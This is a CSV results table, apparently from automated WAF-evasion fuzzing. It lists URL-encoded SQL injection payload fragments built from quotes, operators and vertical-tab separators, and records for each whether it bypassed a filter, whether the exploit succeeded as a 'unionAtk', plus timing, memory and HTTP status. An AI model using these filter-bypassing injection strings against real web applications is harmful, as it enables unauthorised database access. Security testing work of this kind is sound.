Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0182,70.65,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0141,70.65,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0155,70.65,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0135,70.65,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0138,70.65,No,200
0'||+1<@%0bor,Bypassed,No,None,Unknown,0.0097,70.65,No,500
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0124,70.75,No,200
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0109,70.88,No,500
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0208,71.54,No,500
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0171,71.54,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.008,71.54,No,200
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0149,71.54,No,500
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0123,71.54,No,200
0'||+!@<@+or,Bypassed,No,None,Unknown,0.0087,71.54,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0114,71.54,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0118,71.54,No,200
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0157,71.54,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0092,71.54,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0107,71.54,No,500
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0143,71.54,No,500
0%27||%0b1<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0159,70.65,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0282,70.65,No,500
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0141,70.65,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0189,70.65,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0171,70.65,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0166,70.65,No,200
0%27or+!@<@%0bor,Bypassed,Yes,unionAtk,Unknown,0.0126,70.65,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0171,70.65,No,500
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0209,70.65,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0187,70.65,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0227,70.65,No,200
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0218,70.65,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0207,70.65,No,200
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0124,70.65,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.025,70.65,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0133,70.65,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0151,70.65,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0219,70.65,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0158,70.65,No,500
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0163,70.65,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0188,70.65,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0124,70.65,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0144,70.65,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0268,70.65,No,200
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0154,70.65,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0119,70.65,No,200
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0163,70.65,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0108,70.65,No,500
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0127,70.65,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.023,70.65,No,200
0%27or+@<@.%0bor,Bypassed,Yes,unionAtk,Unknown,0.0137,70.65,No,200
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0129,70.65,No,500
0'<@=1+||+,Bypassed,No,None,Unknown,0.0255,70.65,No,500
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0097,70.65,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0089,70.65,No,500
0%27or+1<@.%0b||,Bypassed,Yes,unionAtk,Unknown,0.0102,70.65,No,200
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0147,70.65,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0084,70.65,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0121,70.75,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0099,71.23,No,500
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,71.54,No,200
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0131,71.54,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0138,71.54,No,500
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0156,71.54,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0099,71.54,No,500
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0135,71.54,No,200
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0131,71.54,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.022,71.54,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0162,71.54,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0159,71.54,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0211,70.65,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0176,70.65,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0239,70.65,No,200
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0111,70.65,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0214,70.65,No,200
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0164,70.65,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0168,70.65,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.013,70.65,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0086,70.65,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0202,70.65,No,500
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0153,70.65,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0236,70.65,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0163,70.65,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0098,70.65,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0144,70.65,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0253,70.65,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.023,70.65,No,500
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0191,70.65,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0186,70.65,No,500
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0266,70.65,No,500
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0287,70.65,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0158,70.65,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0177,70.65,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0155,70.65,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0168,70.65,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0125,70.65,No,200
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0138,70.65,No,200
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0119,70.65,No,500
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0146,70.65,No,500
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0091,70.65,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.012,70.65,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0191,70.65,No,200
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0126,70.65,No,200
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0064,70.65,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0119,70.65,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,70.65,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0138,70.65,No,200
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0134,70.65,No,500
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,70.75,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0098,71.17,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0082,71.54,No,500
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.0174,71.54,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0115,71.54,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0154,71.54,No,500
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0066,71.54,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.009,71.54,No,200
0%27or+1<@+||,Bypassed,Yes,unionAtk,Unknown,0.0101,71.54,No,200
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.011,71.54,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0157,71.54,No,200
0'or%0b1<@%0bor,Bypassed,No,None,Unknown,0.0102,71.54,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0103,70.65,No,200
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0153,70.65,No,500
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0207,70.65,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0179,70.65,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.014,70.65,No,200
0%27<@=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0174,70.65,No,200
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0133,70.65,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0172,70.65,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0214,70.65,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0119,70.65,No,200
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0283,70.65,No,500
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0152,70.65,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0201,70.65,No,500
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0292,70.65,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0143,70.65,No,200
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0169,70.65,No,500
0'or+1<@+||,Bypassed,No,None,Unknown,0.018,70.65,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0205,70.65,No,500
0'||%0b@<@.+or,Bypassed,No,None,Unknown,0.0096,70.65,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0222,70.65,No,500
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0112,70.65,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0326,70.65,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0199,70.65,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0128,70.65,No,200
0%27||%0b@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0202,70.65,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0187,70.65,No,200
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0096,70.65,No,200
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0167,70.65,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0142,70.65,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0117,70.65,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0094,70.65,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0131,70.65,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0085,70.65,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0096,70.65,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0083,70.65,No,500
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0144,70.75,No,200
0%27<@=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0166,71.23,No,200
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0121,71.54,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.01,71.54,No,200
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0101,71.54,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0092,71.54,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0122,71.54,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0096,71.54,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0126,71.54,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0177,71.54,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0126,71.54,No,200
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0134,71.54,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0089,71.54,No,500
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0204,71.54,No,200
0%27||%0b@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0142,71.54,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0261,70.65,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0091,70.65,No,200
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.015,70.65,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0196,70.65,No,500
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0155,70.65,No,200
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0155,70.65,No,500
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0184,70.65,No,500
0%27||%0b@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0196,70.65,No,200
0'or%0b@<@+or,Bypassed,No,None,Unknown,0.0245,70.65,No,500
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0169,70.65,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0163,70.65,No,200
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0201,70.65,No,200
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0112,70.65,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0197,70.65,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0091,70.65,No,200
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.015,70.65,No,200
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0149,70.65,No,200
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0114,70.65,No,500
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0189,70.65,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.019,70.65,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0131,70.65,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.018,70.65,No,500
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0156,70.65,No,500
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0269,70.65,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0134,70.65,No,500
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0199,70.65,No,200
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0157,70.65,No,500
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0166,70.65,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0131,70.65,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0102,70.65,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0128,70.65,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0078,70.65,No,500
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0125,70.65,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0075,70.65,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0128,70.65,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0095,70.75,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0081,70.88,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.015,71.36,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0108,71.54,No,200
0'<@=1%0b||%0b,Bypassed,No,None,Unknown,0.0173,71.54,No,500
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0141,71.54,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0093,71.54,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0162,71.54,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0209,71.54,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0064,71.54,No,500
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0179,71.54,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0158,71.54,No,200
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0142,71.54,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0132,71.54,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0118,71.54,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0144,71.54,No,500
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0188,71.54,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,71.54,No,200
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0153,71.54,No,200
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0115,71.54,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0227,71.54,No,500
0'or%0b@<@.%0b||,Bypassed,No,None,Unknown,0.0135,71.54,No,500
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0165,71.54,No,500
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0114,71.54,No,500
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0237,71.54,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0238,71.54,No,200
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0151,71.54,No,200
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0209,71.54,No,200
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0111,71.54,No,500
0'<@=1%0b||%0b,Bypassed,No,None,Unknown,0.0179,71.54,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0161,71.54,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0216,71.54,No,200
0%27||+!@<@.%0b||,Bypassed,Yes,unionAtk,Unknown,0.019,71.54,No,200
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0244,71.54,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0163,71.54,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0112,71.54,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0302,71.54,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0163,71.54,No,500
0%27||%0b!@<@.+||,Bypassed,Yes,unionAtk,Unknown,0.014,71.54,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.012,71.54,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0189,71.54,No,500
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0169,71.54,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0198,71.54,No,200
0%27||+@<@%0bor,Bypassed,Yes,unionAtk,Unknown,0.0274,71.54,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0172,71.54,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0095,71.54,No,500
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0126,71.54,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0102,71.54,No,200
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0155,71.54,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0156,71.54,No,200
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0135,71.54,No,500
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0124,71.54,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.019,71.54,No,200
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0122,71.54,No,200
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0104,71.54,No,500
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0192,71.54,No,500
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.01,71.54,No,500
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0182,71.54,No,200
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0139,71.54,No,500
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0155,71.54,No,500
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0097,71.54,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0145,71.54,No,200
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0101,71.54,No,200
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.0142,71.54,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0083,71.54,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0108,71.54,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0157,71.54,No,200
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0192,71.54,No,500
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0215,71.54,No,200
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0223,71.54,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0142,71.54,No,200
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0172,71.54,No,500
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0167,71.54,No,500
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0154,71.54,No,500
0'||%0b@<@.%0b||,Bypassed,No,None,Unknown,0.0154,71.54,No,500
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0175,71.54,No,500
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0229,71.54,No,500
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0246,71.54,No,200
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0125,71.54,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0163,71.54,No,200
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0216,71.54,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.021,71.54,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0172,71.54,No,500
0%27or+@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0238,71.54,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.009,71.54,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0146,71.54,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0185,71.54,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,71.54,No,200
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,71.54,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.023,71.54,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0134,71.54,No,200
0'<@=1%0b||%0b,Bypassed,No,None,Unknown,0.0151,71.54,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0266,71.54,No,500
0'or+@<@%0bor,Bypassed,No,None,Unknown,0.0117,71.54,No,500
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0108,71.54,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0167,71.54,No,200
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.013,71.54,No,500
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0145,71.54,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0143,71.54,No,200
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0163,71.54,No,200
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0152,71.54,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.008,71.54,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0131,71.54,No,500
0%27or%0b!@<@.+||,Bypassed,Yes,unionAtk,Unknown,0.0177,71.54,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.016,71.54,No,200
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0114,71.54,No,200
